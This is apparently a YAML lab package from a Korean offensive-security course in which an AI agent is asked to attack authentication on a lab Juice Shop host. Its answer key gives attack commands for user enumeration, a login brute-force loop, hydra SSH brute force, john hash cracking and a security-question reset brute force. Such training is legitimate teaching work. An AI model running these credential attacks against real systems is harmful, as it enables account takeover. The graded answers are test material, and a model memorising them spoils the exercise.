lab_id: attack-ai-week05
title: 인증 공격 (Authentication Attacks) - AI 지원
version: ai
course: attack-ai
week: 5
description: AI 에이전트를 활용하여 인증 메커니즘을 공격한다. AI가 자동으로 사용자 열거, 비밀번호 브루트포스, JWT 분석을 수행하고,
  인증 취약점을 체계적으로 평가한다.
difficulty: medium
duration_minutes: 120
objectives:
- AI를 사용한 자동 크리덴셜 수집 및 브루트포스를 수행한다
- AI가 JWT 토큰을 분석하고 약점을 식별하는 과정을 학습한다
- 인증 공격의 자동화 한계를 이해한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: AI에게 사용자 목록을 자동 수집하도록 요청하라.
  hint: 사용자 열거
  category: recon
  points: 10
  answer: curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json;
    [print(u['email']) for u in json.load(sys.stdin)['data']]"
  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
  script: ai_user_enum.py
  verify:
    type: output_contains
    expect: result
    field: stdout
- order: 2
  instruction: AI에게 수동 브루트포스를 자동화하도록 요청하라.
  hint: 브루트포스 자동화
  category: exploit
  points: 10
  answer: for pw in admin admin123 password; do curl -s -X POST .../rest/user/login
    ...; done
  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
  script: ai_bruteforce.py
  verify:
    type: output_contains
    expect: result
    field: stdout
- order: 3
  instruction: AI에게 hydra를 사용한 SSH 브루트포스를 수행하도록 요청하라.
  hint: SSH 브루트포스
  category: exploit
  points: 10
  answer: hydra -l web -P /tmp/top100.txt ssh://10.20.30.80 -t 4 -f
  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
  script: ai_hydra_ssh.py
  verify:
    type: output_contains
    expect: result
    field: stdout
- order: 4
  instruction: AI에게 비밀번호 해시 크래킹을 자동화하도록 요청하라.
  hint: 해시 크래킹
  category: exploit
  points: 10
  answer: echo -n 'admin123' | md5sum | john --format=raw-md5 --wordlist=rockyou.txt
  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
  script: ai_hash_crack.py
  verify:
    type: output_contains
    expect: result
    field: stdout
- order: 5
  instruction: AI에게 보안 질문 브루트포스를 수행하도록 요청하라.
  hint: 보안 질문 공격
  category: exploit
  points: 10
  answer: 'curl -s -X POST .../rest/user/reset-password -d ''{"email":"admin@juice-sh.op","answer":"..."}'' '
  answer_detail: AI가 이 작업을 자동화하여 수동 대비 효율과 일관성을 높인다. CCC 증적 시스템에 결과가 자동 기록된다.
